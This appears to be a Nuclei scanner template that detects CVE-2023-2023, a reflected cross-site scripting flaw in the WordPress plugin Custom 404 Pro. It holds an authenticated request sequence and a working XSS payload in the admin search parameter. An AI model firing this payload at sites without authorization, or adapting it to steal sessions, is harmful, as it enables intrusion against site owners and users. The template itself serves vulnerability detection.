http:
- matchers:
  - condition: and
    dsl:
    - status_code_2 == 200
    - contains(content_type_2, "text/html")
    - contains(body_2, "onanimationstart=alert(document.domain)//")
    - contains(body_2, "Custom 404 Pro")
    type: dsl
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    log={{username}}&pwd={{password}}&wp-submit=Log+In

    '
  - 'GET /wp-admin/admin.php?page=c4p-main&s={{randstr}}%22%20style=animation-name:rotation%20onanimationstart=alert(document.domain)//
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2023-2023
info:
  author: r3Y3r53
  classification:
    cpe: cpe:2.3:a:kunalnagar:custom_404_pro:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2023-2023
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.99221
    epss-score: 0.83097
  description: 'Custom 404 Pro before 3.7.3 is susceptible to cross-site scripting
    via the search parameter due to insufficient input sanitization and output escaping.
    An attacker can inject arbitrary script in the browser of an unsuspecting user
    in the context of the affected site. This can allow the attacker to steal cookie-based
    authentication credentials and launch other attacks.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    inject malicious scripts into web pages viewed by users, leading to potential
    data theft, session hijacking, or defacement of the affected website.

    '
  metadata:
    framework: wordpress
    max-request: 2
    product: custom_404_pro
    vendor: kunalnagar
    verified: true
  name: Custom 404 Pro < 3.7.3 - Cross-Site Scripting
  reference:
  - https://wpscan.com/vulnerability/8859843a-a8c2-4f7a-8372-67049d6ea317
  - https://wordpress.org/plugins/custom-404-pro/advanced/
  - https://nvd.nist.gov/vuln/detail/CVE-2023-2023
  - https://github.com/GREENHAT7/pxplan
  - https://github.com/thatformat/Hvv2023
  remediation: Fixed in version 3.7.3
  severity: medium
  tags: cve2023,cve,wpscan,xss,wordpress,wp-plugin,authenticated,custom-404-pro,intrusive,kunalnagar,vuln
